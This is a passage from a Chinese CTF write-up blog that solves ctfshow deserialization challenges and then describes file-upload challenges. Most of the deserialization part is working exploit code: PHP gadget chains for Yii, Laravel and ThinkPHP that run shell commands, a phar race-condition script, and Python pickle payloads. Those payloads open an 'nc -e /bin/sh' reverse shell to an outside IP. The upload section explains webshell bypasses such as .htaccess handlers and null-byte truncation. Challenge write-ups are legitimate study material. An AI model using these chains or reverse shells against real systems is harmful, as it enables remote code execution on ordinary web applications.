            $this-&gt;processes[]=new Generator();
        &#125;
    &#125;
&#125;
namespace&#123;


    use Codeception\Extension\RunProcess;

    echo base64_encode(serialize(new RunProcess()));
&#125;
</code></pre>
<img src="https://img.hzy2003628.top/image-20230731230121810.png" alt="image-20230731230121810" style="zoom:200%;">
<p>ctfshow{22a3d235-e0cc-4f70-933f-41b63de6188e}</p>
<h1 id="web269">web269</h1>
<pre><code class="hljs plaintext">&lt;?php
namespace yii\rest &#123;
    class Action
    &#123;
        public $checkAccess;
    &#125;
    class IndexAction
    &#123;
        public function __construct($func, $param)
        &#123;
            $this-&gt;checkAccess = $func;
            $this-&gt;id = $param;
        &#125;
    &#125;
&#125;
namespace yii\web &#123;
    abstract class MultiFieldSession
    &#123;
        public $writeCallback;
    &#125;
    class DbSession extends MultiFieldSession
    &#123;
        public function __construct($func, $param)
        &#123;
            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];
        &#125;
    &#125;
&#125;
namespace yii\db &#123;
    use yii\base\BaseObject;
    class BatchQueryResult
    &#123;
        private $_dataReader;
        public function __construct($func, $param)
        &#123;
            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);
        &#125;
    &#125;
&#125;
namespace &#123;
    $exp = new \yii\db\BatchQueryResult(&#x27;shell_exec&#x27;, &#x27;cp /f* 1.txt&#x27;); //命令执行
    echo(base64_encode(serialize($exp)));
&#125;



//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxNToiY3AgL2YqIGZsYWcudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0</code></pre>
<img src="https://img.hzy2003628.top/image-20230731230342208.png" alt="image-20230731230342208" style="zoom:200%;">
<p>ctfshow{698ebcf9-5645-44b8-8a09-073c51c49cd0}</p>
<h1 id="web270">web270</h1>
<p>同269</p>
<h1 id="web271">web271</h1>
<p>Laravel5.7 反序列化漏洞，还是先照搬poc</p>
<pre><code class="hljs plaintext">&lt;?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell &lt;taylor@laravel.com&gt;
 */

define(&#x27;LARAVEL_START&#x27;, microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We&#x27;ll simply require it
| into the script here so that we don&#x27;t have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__ . &#x27;/../vendor/autoload.php&#x27;;

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__ . &#x27;/../bootstrap/app.php&#x27;;

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client&#x27;s browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);
$response = $kernel-&gt;handle(
    $request = Illuminate\Http\Request::capture()
);
@unserialize($_POST[&#x27;data&#x27;]);
highlight_file(__FILE__);

$kernel-&gt;terminate($request, $response);</code></pre>
<p>poc如下</p>
<pre><code class="hljs plaintext">&lt;?php

namespace Illuminate\Foundation\Testing &#123;
    class PendingCommand
    &#123;
        public $test;
        protected $app;
        protected $command;
        protected $parameters;

        public function __construct($test, $app, $command, $parameters)
        &#123;
            $this-&gt;test = $test;                 //一个实例化的类 Illuminate\Auth\GenericUser
            $this-&gt;app = $app;                   //一个实例化的类 Illuminate\Foundation\Application
            $this-&gt;command = $command;           //要执行的php函数 system
            $this-&gt;parameters = $parameters;     //要执行的php函数的参数  array(&#x27;id&#x27;)
        &#125;
    &#125;
&#125;

namespace Faker &#123;
    class DefaultGenerator
    &#123;
        protected $default;

        public function __construct($default = null)
        &#123;
            $this-&gt;default = $default;
        &#125;
    &#125;
&#125;

namespace Illuminate\Foundation &#123;
    class Application
    &#123;
        protected $instances = [];

        public function __construct($instances = [])
        &#123;
            $this-&gt;instances[&#x27;Illuminate\Contracts\Console\Kernel&#x27;] = $instances;
        &#125;
    &#125;
&#125;

namespace &#123;
    $defaultgenerator = new Faker\DefaultGenerator(array(&quot;hello&quot; =&gt; &quot;world&quot;));

    $app = new Illuminate\Foundation\Application();

    $application = new Illuminate\Foundation\Application($app);

    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, &#x27;system&#x27;, array(&#x27;cp /f* 1.txt&#x27;)); //此处执行命令

    echo urlencode(serialize($pendingcommand));
&#125;
</code></pre>
<p>ctfshow{7d2d5c71-7b71-4c35-b5e6-690e45e9b2ea}</p>
<h1 id="web272">web272</h1>
<p>Laravel5.8 反序列化漏洞</p>
<p>poc如下</p>
<pre><code class="hljs plaintext">&lt;?php
namespace Illuminate\Broadcasting&#123;

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    &#123;
        protected $events;
        protected $event;
        public function __construct()&#123;
            $this-&gt;events=new Dispatcher();
            $this-&gt;event=new QueuedCommand();
        &#125;
    &#125;
&#125;
namespace Illuminate\Foundation\Console&#123;

    use Mockery\Generator\MockDefinition;

    class QueuedCommand
    &#123;
        public $connection;
        public function __construct()&#123;
            $this-&gt;connection=new MockDefinition();
        &#125;
    &#125;
&#125;
namespace Illuminate\Bus&#123;

    use Mockery\Loader\EvalLoader;

    class Dispatcher
    &#123;
        protected $queueResolver;
        public function __construct()&#123;
            $this-&gt;queueResolver=[new EvalLoader(),&#x27;load&#x27;];
        &#125;
    &#125;
&#125;
namespace Mockery\Loader&#123;
    class EvalLoader
    &#123;

    &#125;
&#125;
namespace Mockery\Generator&#123;
    class MockDefinition
    &#123;
        protected $config;
        protected $code;
        public function __construct()
        &#123;
            $this-&gt;code=&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit()?&gt;&quot;; //此处是PHP代码
            $this-&gt;config=new MockConfiguration();
        &#125;
    &#125;
    class MockConfiguration
    &#123;
        protected $name=&quot;feng&quot;;
    &#125;
&#125;

namespace&#123;

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
&#125;
</code></pre>
<img src="https://img.hzy2003628.top/image-20230731230921232.png" alt="image-20230731230921232" style="zoom:200%;">
<p>ctfshow{252df281-e370-4ad7-a613-7b1c3098cbd4}</p>
<h1 id="web273">web273</h1>
<p>同272</p>
<h1 id="web274">web274</h1>
<p>TP5.1反序列化漏洞，直接粘poc【抽时间还会复现跟一下链子，单独写一个学习记录】</p>
<pre><code class="hljs plaintext">&lt;?php
namespace think;
abstract class Model&#123;
    protected $append = [];
    private $data = [];
    function __construct()&#123;
        $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];
        $this-&gt;data = [&quot;lin&quot;=&gt;new Request()];
    &#125;
&#125;
class Request
&#123;
    protected $hook = [];
    protected $filter = &quot;system&quot;; //PHP函数
    protected $config = [
        // 表单ajax伪装变量
        &#x27;var_ajax&#x27;         =&gt; &#x27;_ajax&#x27;,
    ];
    function __construct()&#123;
        $this-&gt;filter = &quot;system&quot;;
        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; //PHP函数的参数
        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];
    &#125;
&#125;


namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
&#123;
    private $files = [];

    public function __construct()
    &#123;
        $this-&gt;files=[new Pivot()];
    &#125;
&#125;
namespace think\model;

use think\Model;

class Pivot extends Model
&#123;
&#125;
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?&gt;
//TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</code></pre>
<img src="https://img.hzy2003628.top/image-20230731232037253.png" alt="image-20230731232037253" style="zoom:200%;">
<p>ctfshow{f140fd81-e50f-4cf4-97ee-4f6a94233363}</p>
<h1 id="web275">web275</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-08 19:13:36
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-08 20:08:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


highlight_file(__FILE__);

class filter&#123;
    public $filename;
    public $filecontent;
    public $evilfile=false;

    public function __construct($f,$fn)&#123;
        $this-&gt;filename=$f;
        $this-&gt;filecontent=$fn;
    &#125;
    public function checkevil()&#123;
        if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;
            $this-&gt;evilfile=true;
        &#125;
        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;
            $this-&gt;evilfile=true;
        &#125;
        return $this-&gt;evilfile;
    &#125;
    public function __destruct()&#123;
        if($this-&gt;evilfile)&#123;
            system(&#x27;rm &#x27;.$this-&gt;filename);
        &#125;
    &#125;
&#125;

if(isset($_GET[&#x27;fn&#x27;]))&#123;
    $content = file_get_contents(&#x27;php://input&#x27;);
    $f = new filter($_GET[&#x27;fn&#x27;],$content);
    if($f-&gt;checkevil()===false)&#123;
        file_put_contents($_GET[&#x27;fn&#x27;], $content);
        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);
        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);
        echo &#x27;work done&#x27;;
    &#125;
    
&#125;else&#123;
    echo &#x27;where is flag?&#x27;;
&#125;

where is flag?</code></pre>
<p>直接分号分割</p>
<img src="https://img.hzy2003628.top/image-20230731231500498.png" alt="image-20230731231500498" style="zoom:200%;">
<p>ctfshow{32a26a24-10a2-42dd-8aaa-bda75f1d9394}</p>
<h1 id="web276">web276</h1>
<ul>
<li>Phar反序列化</li>
</ul>
<p>题目源码如下</p>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-08 19:13:36
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-08 20:08:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


highlight_file(__FILE__);

class filter&#123;
    public $filename;
    public $filecontent;
    public $evilfile=false;
    public $admin = false;

    public function __construct($f,$fn)&#123;
        $this-&gt;filename=$f;
        $this-&gt;filecontent=$fn;
    &#125;
    public function checkevil()&#123;
        if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;
            $this-&gt;evilfile=true;
        &#125;
        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;
            $this-&gt;evilfile=true;
        &#125;
        return $this-&gt;evilfile;
    &#125;
    public function __destruct()&#123;
        if($this-&gt;evilfile &amp;&amp; $this-&gt;admin)&#123;
            system(&#x27;rm &#x27;.$this-&gt;filename);
        &#125;
    &#125;
&#125;

if(isset($_GET[&#x27;fn&#x27;]))&#123;
    $content = file_get_contents(&#x27;php://input&#x27;);
    $f = new filter($_GET[&#x27;fn&#x27;],$content);
    if($f-&gt;checkevil()===false)&#123;
        file_put_contents($_GET[&#x27;fn&#x27;], $content);
        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);
        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);
        echo &#x27;work done&#x27;;
    &#125;
    
&#125;else&#123;
    echo &#x27;where is flag?&#x27;;
&#125;

where is flag?</code></pre>
<h2 id="phar前置知识补充">Phar前置知识补充</h2>
<p>在这里也借着这道题目初步学习一下phar反序列化</p>
<p>总而言之就是一些PHP题目是没有反序列化点的，这个时候就需要往phar上靠，因为很多访问路径是可以用到一些伪协议的，phar://就是其中的一个，可以简单理解这个phar伪协议的作用就是解压phar文件，没错，也可以把phar文件当成压缩包</p>
<p>phar文件有个标志必须有，<?php xxx;__HALT_COMPILER();?>，只有有这个标志才会被识别为phar文件，在phar文件中是存在序列化数据的，会以序列化字符串的形式存储用户自写的meta-data</p>
<p>这里也初步演示认识一下phar</p>
<blockquote>
<p>用phpstudy的，要生成phar文件需要将自己对应的php的php.ini里面的<strong>phar.readonly</strong>设置成Off，并且把最前面的分号去掉</p>
</blockquote>
<p>简单的生成phar的程序</p>
<pre><code class="hljs plaintext">&lt;?php
    class TestObject &#123;
    &#125;
    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
    $o = new TestObject();
    $o -&gt; data=&#x27;hu3sky&#x27;;
    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
    //签名自动计算
    $phar-&gt;stopBuffering();
?&gt;</code></pre>
<p>访问一下即可生成一个phar.phar</p>
<img src="https://img.hzy2003628.top/image-20230803144908224.png" alt="image-20230803144908224" style="zoom:200%;">
<blockquote>
<?php __HALT_COMPILER(); ?>     就是刚才说的必带的标志
<p>O:10:“TestObject”:1:{s:4:“data”;s:6:“hu3sky”;}    这个就是用户的meta-data，进行了序列化存储</p>
</blockquote>
<p>当然，如何去判断能否利用phar，基本遇到下面的几个函数就可以通过phar伪协议来解析phar文件进行反序列化操作</p>
<pre><code class="hljs plaintext">fileatime
filectime
file_exists
file_get_contents
file_put_contents
file
filegroup
fopen
fileinode
filemtime
fileowner
fileperms
is_dir
is_executable
is_file
is_link
is_readable
is_writable
is_writeable
parse_ini_file
copy
unlink
stat
readfile</code></pre>
<p>利用条件需要满足</p>
<blockquote>
<p>除了上面的函数之外需要有可用的魔法函数调用当作中间跳板，函数参数可控，并且不能过滤phar://</p>
<p>满足这些条件就能用phar反序列化</p>
</blockquote>
<p>这里也举个例子，伪协议读取phar文件然后就会进行反序列化，读取刚才生成的那个phar.phar</p>
<pre><code class="hljs plaintext">&lt;?php
class TestObject&#123;
    function __destruct()
    &#123;
        echo $this -&gt; data;   // TODO: Implement __destruct() method.
    &#125;
&#125;
include(&#x27;phar://phar.phar&#x27;);
?&gt;</code></pre>
<img src="https://img.hzy2003628.top/image-20230803145425539.png" alt="image-20230803145425539" style="zoom:200%;">
<p>还有就是一部分题目会不让传phar文件，就像文件上传题目不让上传php文件那样，我们应该去修改文件类型，那phar修改文件类型的方法也放这</p>
<blockquote>
<p>可以看到，识别是不是phar就是看上面的那个__HALT_COMPILER();?&gt;这段代码，所以我们只要在不影响系统识别phar文件的情况下也就是不动这个标志即可，可以对前面或者其后面的内容进行修改，加入想要伪造的文件类型的文件头以及后缀名即可</p>
</blockquote>
<p>这里举个例子，就是将phar.phar文件伪造成gif文件，也就是在标志前面加一个GIF89a</p>
<pre><code class="hljs plaintext">&lt;?php
class TestObject &#123;
&#125;
$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
$phar-&gt;startBuffering();
$phar-&gt;setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); //设置stub
$o = new TestObject();
$o -&gt; data=&#x27;hu3sky&#x27;;
$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
//签名自动计算
$phar-&gt;stopBuffering();
?&gt;</code></pre>
<img src="https://img.hzy2003628.top/image-20230803164825868.png" alt="image-20230803164825868" style="zoom:200%;">
<h2 id="开做">开做</h2>
<p>还是分号拼接执行命令</p>
<p>poc如下</p>
<pre><code class="hljs plaintext">&lt;?php
class filter &#123;
    public $filename = &#x27;1.txt;cat f*&#x27;;
    public $filecontent;
    public $evilfile=true;
    public $admin = true;
&#125;
$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
$phar-&gt;startBuffering();
$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); //设置stub
$o = new filter();
$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
//签名自动计算
$phar-&gt;stopBuffering();
?&gt;</code></pre>
<p>生成phar包，但是可以发现有unlink函数，会一直删除，所以需要条件竞争执行</p>
<blockquote>
<p>BP条件竞争  ||  python脚本</p>
</blockquote>
<p>这里找了一个网上其他师傅写的脚本，直接套了</p>
<pre><code class="hljs plaintext">import requests
import threading
url=&quot;http://66155619-f7c6-4fb4-acf1-d196be37cdb8.chall.ctf.show:8080/&quot;
f=open(&quot;./yn.phar&quot;,&quot;rb&quot;)
content=f.read()
def upload():  
    requests.post(url=url+&quot;?fn=1.phar&quot;,data=content)
def read():  
    r = requests.post(url=url+&quot;?fn=phar://1.phar/&quot;,data=&quot;1&quot;)
    if &quot;ctfshow&#123;&quot;in r.text or &quot;flag&#123;&quot; in r.text:
        print(r.text)
        exit()
while 1:
    t1=threading.Thread(target=upload)
    t2=threading.Thread(target=read)
    t1.start()
    t2.start()</code></pre>
<img src="https://img.hzy2003628.top/image-20230803175440130.png" alt="image-20230803175440130" style="zoom:200%;">
<p>ctfshow{e2f7b8ff-833f-49af-a57c-0bcdd3a3716e}</p>
<h1 id="web277">web277</h1>
<ul>
<li>python反序列化</li>
</ul>
<img src="https://img.hzy2003628.top/image-20230803175724700.png" alt="image-20230803175724700" style="zoom:200%;">
<p>看注释</p>
<img src="https://img.hzy2003628.top/image-20230803175743254.png" alt="image-20230803175743254" style="zoom:200%;">
<pre><code class="hljs plaintext">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</code></pre>
<p>pickle反序列化，可以用自己的服务器接收信息反弹shell，也可以用在线平台进行接收信息</p>
<p>poc如下</p>
<pre><code class="hljs plaintext">import os
import pickle
import base64
import requests
class exp(object):
    def __reduce__(self):
        return (os.popen,(&#x27;nc 101.42.45.215 7789 -e /bin/sh&#x27;,))#此处需要nc VPS的IP...

a=exp()
s=pickle.dumps(a)
url=&quot;http://d9a47af4-ee63-4b4a-9d54-e18c4457a73d.challenge.ctf.show/backdoor&quot;
params=&#123;
    &#x27;data&#x27;:base64.b64encode(s)
&#125;

r=requests.get(url=url,params=params)
print(r.text)</code></pre>
<img src="https://img.hzy2003628.top/image-20230803180109383.png" alt="image-20230803180109383" style="zoom:200%;">
<p>ctfshow{68e8812c-9aca-4bd0-b906-e54c3399f12b}</p>
<h1 id="web278">web278</h1>
<ul>
<li>python反序列化</li>
</ul>
<p>过滤了os.system</p>
<p>poc如下</p>
<pre><code class="hljs plaintext">import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        return os.popen, (&quot;nc xxx.xxx.xxx.xxx 7777 -e /bin/sh&quot;,)


print(base64.b64encode(pickle.dumps(RCE())))
//gASVNwAAAAAAAACMAm9zlIwFcG9wZW6Uk5SMIG5jIDEwMS40Mi40NS4yMTUgNzc3NyAtZSAvYmluL3NolIWUUpQu</code></pre>
<img src="https://img.hzy2003628.top/image-20230803180555371.png" alt="image-20230803180555371" style="zoom:200%;">
<p>ctfshow{32132a71-8e96-490a-8378-aa28957f7294}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW文件上传</title>
    <url>/2022/02/08/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>文件上传题型</p>
<span id="more"></span>
<h1 id="文件上传1图片马上传">文件上传1–图片马上传</h1>
<p><img src="https://img.hzy2003628.top/44d4509d24bfbb31e78d0206fef19b49.png" alt="image-20220208184616805"></p>
<p><img src="https://img.hzy2003628.top/404fc0b3d659d1cad6dfa26d56c491cf.png" alt="image-20220208184653016"></p>
<p>直接上传一句话发现不行，只允许上传图片，那就制作图片马上传吧！</p>
<p><img src="https://img.hzy2003628.top/b093fdb2f10746ae3910281dc3a7c558.png" alt="image-20220208184858927"></p>
<p>但是发现还是不能正常上传，这就该考虑是不是过滤了，尝试将php改为php3.4.5或者phtml试试</p>
<p><img src="https://img.hzy2003628.top/c95eeeb51c74f607b5819a622fad9b35.png" alt="image-20220208185100735"></p>
<p>放一个图吧，这发现还是不行。这个时候就应该考虑应该是Content-Type: multipart/form-data被拦截，这个是有解决办法的，strpos()区分大小写，使用大写绕过即可</p>
<p><img src="https://img.hzy2003628.top/91d56f1cd515922500c99aba5bf0512c.png" alt="image-20220208185355163"></p>
<p>这个时候发现依然不行，那应该对上传文件的格式页有黑名单，那把php改成php4试试(php3和php5都试了，发现不行)</p>
<p><img src="https://img.hzy2003628.top/c6db479da059d6f8d7dbb109f417ec6e.png" alt="image-20220208185459783"></p>
<p>这个时候发现终于可以上传了。</p>
<p>然后上蚁剑shell，即可顺利得到flag!</p>
<h1 id="文件上传2不需要验证">文件上传2–不需要验证</h1>
<p>这类题型比较简单！</p>
<p><img src="https://img.hzy2003628.top/b46bbc9e601b96776fb0a2f775cd8d71.png" alt="image-20220213092711909"></p>
<p>直接上传一句话然后蚁剑连接就可！</p>
<p><img src="https://img.hzy2003628.top/8f8d72b9a0d9e8ce97a906b66824638d.png" alt="image-20220213092746633"></p>
<p><img src="https://img.hzy2003628.top/aa35cf8ea67374cddd7bc23d7883fa0e.png" alt="image-20220213092907477"></p>
<h1 id="文件上传3初步的前端验证">文件上传3–初步的前端验证</h1>
<p><img src="https://img.hzy2003628.top/146ddb8cc158e6e10d4cb90fd7bf25df.png" alt="image-20220213094222453"></p>
<p>这个时候再上传一句话木马就不可以了，需要上传图片马来进行绕过前端验证！bp抓包改后缀<img src="https://img.hzy2003628.top/18f8c36b78ebbbbf0c9b24b206fc98a0.png" alt="image-20220213094425933"></p>
<p><img src="https://img.hzy2003628.top/18bd58921a30a5a96472da395a5b3e73.png" alt="image-20220213095256115"></p>
<p>成功上传，然后蚁剑连接，得到flag！</p>
<h1 id="文件上传4文件头检查绕过">文件上传4–文件头检查绕过</h1>
<p><img src="https://img.hzy2003628.top/863985a9bca47467ec94e1bf971a3a09.png" alt="image-20220213095639275"></p>
<p>首先先bp抓包上传图片马试试<img src="https://img.hzy2003628.top/16e2c42eb0b0d7e028fc53c145488939.png" alt="image-20220213095944411"></p>
<p>发现可以正常上传，那用蚁剑连接看一下<img src="https://img.hzy2003628.top/211240fb4ac22fb7abcf30c5a50e6055.png" alt="image-20220213100041277"></p>
<p>发现可以正常连接！找到flag提交即可！</p>
<p>这里有必要解释一下，因为这个题考察的是文件头检查绕过，但是为啥我做的这么直接呢，这个题有很多种解法，我这个是直接上传图片马，所以文件头Content-type就是image/png，不需要做任何更改就可以上传。</p>
<p>还有一种解法就是得需要修改文件头，那是因为上传的是php文件的一句话，这个时候Content-type就不是image/png了，如果不修改文件头就没有办法正常上传，所以这个时候就会修改为image.png,依次绕过，成功上传！</p>
<h1 id="文件上传5mime绕过">文件上传5–MIME绕过</h1>
<p><img src="https://img.hzy2003628.top/2678614f4f23bde83edb1d27db2a1426.png" alt="image-20220213100857098"></p>
<p>还是先上传个图片马，bp抓包看看！</p>
<p><img src="https://img.hzy2003628.top/405da36697ede869554402dddc094fe3.png" alt="image-20220213100848241"></p>
<p>这个时候发现修改一下后缀还是可以正常上传的，莫非直接蚁剑又可以直接解出来？？？？试试！<img src="https://img.hzy2003628.top/4291c24bfbb53ce346ffaa138b712e8a.png" alt="image-20220213101044425"></p>
<p>emmm，这让我咋说，又是正常直接连接，害！看来不能光做题了，了解一下MIME绕过吧！</p>
<p>MIME(multipurpose Internet mail extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。<img src="https://img.hzy2003628.top/6d29e33d4d6770f4139852ce12c4f84a.png" alt="img"></p>
<p>我看到网上的wp都是需要修改一下文件类型！但是我这又是不用修改就默认是image/png，应该也是因为我上传图片马的缘故吧！我只能说图片马yyds！</p>
<h1 id="文件上传6htaccess">文件上传6–.htaccess</h1>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p><img src="https://img.hzy2003628.top/9873b4028ea4a24f77317c7cf1f813a1.png" alt="image-20220213101632834"></p>
<p><img src="https://img.hzy2003628.top/7332620935aaae5e29b2b21600d65df9.png" alt="image-20220213101839062"></p>
<p>终于不像前几题那样如此敷衍了，这次没有成功上传了！通过代码发现有黑名单，把好多后缀都拉黑了！<img src="https://img.hzy2003628.top/ce89134d3fb85a3274929d63198dda80.png" alt="image-20220213102005201"></p>
<p>了解了一下htaccess文件的特点，这个题可以重写文件的解析规则来绕过，具体步骤就是先上传.htaccess文件，把之前的文件替换掉，文件内容如下：</p>
<pre><code class="hljs plaintext">SetHandler application/x-httpd-php</code></pre>
<p>文件内容是这个，意思就是将上传的文件当作php文件进行解析！</p>
<p>上传好这个文件之后再上传图片马然后直接蚁剑连接即可！!</p>
<blockquote>
<p>（在这里我走过弯路，我以为再上传图片马的时候还是需要像之前那样bp抓包改后缀，结果蚁剑一直都连不上，现在再回想一下，发现.htaccess文件已经起到了这个作用，不需要再换后缀了）</p>
</blockquote>
<p><img src="https://img.hzy2003628.top/5b5bae3ce24233dd5461ebed4beaa7a9.png" alt="image-20220215205204866"></p>
<h1 id="文件上传7-00截断">文件上传7-- 00截断</h1>
<p><img src="https://img.hzy2003628.top/69a9335a405777ee81cbb7e29239623b.png" alt="image-20220215113637612"></p>
<p><img src="https://img.hzy2003628.top/9b8ff85930d93e9739a9ea0beb78f49d.png" alt="image-20220215113733831"></p>
<p>正常上传图片马后发现并不能通过，这个时候发现有白名单绕过</p>
<pre><code class="hljs plaintext">$whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</code></pre>
<p>鉴于这个题是考察00截断，搜查资料发现00截断一般都是在上传路径截断，可以看到请求连接处包含road参数<img src="https://img.hzy2003628.top/f9024a85675fc89523133da555297538.png" alt="image-20220215114956967" style="zoom:200%;"></p>
<p><img src="https://img.hzy2003628.top/d052a507d2f335ee4d29dd099b77ff9d.png" alt="image-20220215222344049"></p>
<p>把这个参数内容修改为<code>/var/www/html/upload/muma.php%00</code>，然后蚁剑连接得到flag！<img src="https://img.hzy2003628.top/6620af75de7e94451ce788a32b59bc6d.png" alt="image-20220215222736575"></p>
<h1 id="文件上传8双写后缀">文件上传8–双写后缀</h1>
<img src="https://img.hzy2003628.top/002dfcbef1ad8e073593e57cc237aff5.png" alt="image-20220215212331181" style="zoom:200%;">
<pre><code class="hljs plaintext">双写后缀绕过用于只将文件后缀名，例如&quot;php&quot;字符串过滤的场合；
例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个&quot;php&quot;字符串&quot;后，开头的&#x27;p&#x27;和结尾的&#x27;hp&#x27;就组合又形成了【php】。</code></pre>
<p><img src="https://img.hzy2003628.top/59a8e50bc958f8f4ee82b051f177550d.png" alt="img"></p>
<p>上传之后这样修改之后发送数据包，然后蚁剑连接，得到flag！<img src="https://img.hzy2003628.top/a5e889c11e631bd18a51b61655c78c4b.png" alt="image-20220215212536157"></p>
<h1 id="文件上传9前端验证">文件上传9–前端验证</h1>
<p><img src="https://img.hzy2003628.top/9ce8fe3bff1e9d904eecdaa77ff38487.png" alt="image-20220206165932472"></p>
<p>这个题说了上传图片，所以php的一句木马应该上传不了，合成一下图片木马上传一下！</p>
<p>但是上传成功之后发现蚁剑还是没有办法连接，这个时候首先考虑到的是前端验证导致的，bp抓包修改一下后缀，把png修改成php,然后蚁剑连接成功，得到flag，放图</p>
<p><img src="https://img.hzy2003628.top/5d31793bdc53189f16fae0c1ea612391.png" alt="image-20220206170213732"></p>
